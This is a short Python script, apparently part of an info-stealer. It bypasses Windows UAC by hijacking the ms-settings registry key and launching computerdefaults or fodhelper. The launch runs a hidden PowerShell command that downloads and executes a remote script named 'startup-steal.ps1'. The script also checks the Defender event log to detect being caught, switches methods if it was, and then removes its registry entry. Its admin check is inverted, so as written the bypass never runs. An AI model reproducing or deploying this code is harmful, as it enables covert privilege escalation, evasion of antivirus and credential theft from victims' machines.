import subprocess, ctypes

def UACbypass(method=1):
    if ctypes.windll.shell32.IsUserAnAdmin():
        run = lambda cmd: subprocess.run(cmd, shell=True, capture_output=True).stdout
        ps_cmd = 'powershell -nop -ep bypass -w hidden -c "iwr -useb https://raw.githubusercontent.com/s1uiasdad/log-acc-v2/main/scr/startup-steal.ps1 | iex"'
        reg_cmd = 'hkcu\\Software\\Classes\\ms-settings\\shell\\open\\command'
        run(f'reg add {reg_cmd} /d "{ps_cmd}" /f')
        run(f'reg add {reg_cmd} /v "DelegateExecute" /f')
        lb = len(run('wevtutil qe "Microsoft-Windows-Windows Defender/Operational" /f:text'))
        run(f'{"computerdefaults" if method == 1 else "fodhelper"} --nouacbypass')
        la = len(run('wevtutil qe "Microsoft-Windows-Windows Defender/Operational" /f:text'))
        run(f'reg delete {reg_cmd} /f')
        return UACbypass(method+1) if la > lb else True if method == 1 else False

if not ctypes.windll.shell32.IsUserAnAdmin():
    UACbypass()
